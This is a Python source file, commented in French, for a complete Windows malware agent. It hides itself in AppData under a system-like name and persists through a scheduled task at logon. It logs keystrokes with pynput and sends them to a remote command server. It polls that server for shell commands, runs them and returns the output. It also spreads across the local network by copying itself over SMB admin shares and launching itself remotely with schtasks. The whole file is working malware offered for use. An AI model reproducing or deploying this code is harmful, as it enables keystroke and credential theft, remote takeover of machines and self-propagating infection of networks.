import os
import sys
import time
import threading
import subprocess
import platform
import shutil
import requests
import socket
import json
from pynput.keyboard import Listener

# --- CONFIGURATION DU NOYAU OMEGA ---
C2_URL = "https://botxxx-production.up.railway.app"
AGENT_ID = f"{platform.node()}_{platform.system()}"
INSTALL_DIR = os.path.join(os.getenv('APPDATA', os.path.expanduser("~")), "WinSystemDiagnostics")
EXE_PATH = os.path.join(INSTALL_DIR, "system_host_service.exe")
POLLING_INTERVAL = 12

# Emulation de trafic pour bypasser les Pare-feux (Défaut 4)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/json,*/*",
    "Connection": "keep-alive"
}

key_buffer = ""

# --- MODULE 1 : PERSISTANCE ET AUTO-NETTOYAGE ---
def bootstrap():
    """Installe l'agent, le cache et crée des tâches de persistance."""
    if not os.path.exists(INSTALL_DIR):
        os.makedirs(INSTALL_DIR)
    
    current_path = os.path.realpath(sys.argv[0])
    if current_path != EXE_PATH:
        try:
            shutil.copy2(current_path, EXE_PATH)
            if platform.system() == "Windows":
                # Masquage profond
                subprocess.run(["attrib", "+h", "+s", EXE_PATH], shell=True)
                # Persistance par Tâche Planifiée (plus discret que le Registre)
                subprocess.run(f'schtasks /create /tn "WinSystemCheck" /tr "{EXE_PATH}" /sc onlogon /rl highest /f', shell=True, capture_output=True)
        except:
            pass

# --- MODULE 2 : KEYLOGGER (CAPTURE D'ENTRÉES) ---
def on_press(key):
    global key_buffer
    try:
        k = str(key).replace("'", "")
        if key == "Key.space": k = " "
        elif key == "Key.enter": k = "\n"
        elif "Key." in k: k = f" [{k.split('.')[1].upper()}] "
        key_buffer += k
    except:
        pass

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# --- MODULE 3 : COMMUNICATION C2 (ÉVASION PARE-FEU) ---
def c2_communication():
    global key_buffer
    while True:
        try:
            # 1. Envoi des logs (Trafic HTTPS simulé)
            if key_buffer:
                requests.post(f"{C2_URL}/logs/{AGENT_ID}", json={"payload": key_buffer}, headers=HEADERS, timeout=10)
                key_buffer = ""

            # 2. Réception de commandes forcées
            resp = requests.get(f"{C2_URL}/get_cmd/{AGENT_ID}", headers=HEADERS, timeout=10)
            if resp.status_code == 200:
                cmd = resp.json().get("command")
                if cmd and cmd != "none":
                    # Exécution et retour immédiat du résultat
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output, error = proc.communicate()
                    requests.post(f"{C2_URL}/result/{AGENT_ID}", json={
                        "output": (output + error).decode('utf-8', errors='ignore'),
                        "command": cmd
                    }, headers=HEADERS)
        except:
            pass
        time.sleep(POLLING_INTERVAL)

# --- MODULE 4 : PROPAGATION LATÉRALE (DÉFAUT 5 BYPASS) ---
def spread_logic():
    """Scan et tentative d'infection via méthodes alternatives (SMB/Schtasks)."""
    while True:
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            subnet = ".".join(local_ip.split('.')[:-1])
            
            for i in range(1, 255):
                target = f"{subnet}.{i}"
                if target == local_ip: continue
                
                # Vérification port SMB (445)
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.2)
                    if s.connect_ex((target, 445)) == 0:
                        # Tentative de mouvement latéral
                        dest = f"\\\\{target}\\C$\\Windows\\Temp\\sys_host.exe"
                        shutil.copy2(EXE_PATH, dest)
                        # Exécution distante via schtasks (souvent moins filtré que WMI)
                        remote_cmd = f'schtasks /create /s {target} /tn "SystemSync" /tr "C:\\Windows\\Temp\\sys_host.exe" /sc once /st 00:00 /f'
                        subprocess.run(remote_cmd, shell=True, capture_output=True)
        except:
            pass
        time.sleep(1800) # Scan toutes les 30 minutes

# --- LANCEUR GLOBAL ---
if __name__ == "__main__":
    # Initialisation de l'environnement
    bootstrap()
    
    # Threads de l'ombre
    threading.Thread(target=start_keylogger, daemon=True).start()
    threading.Thread(target=c2_communication, daemon=True).start()
    threading.Thread(target=spread_logic, daemon=True).start()

    # Maintien du processus actif sans terminal
    while True:
        time.sleep(100)
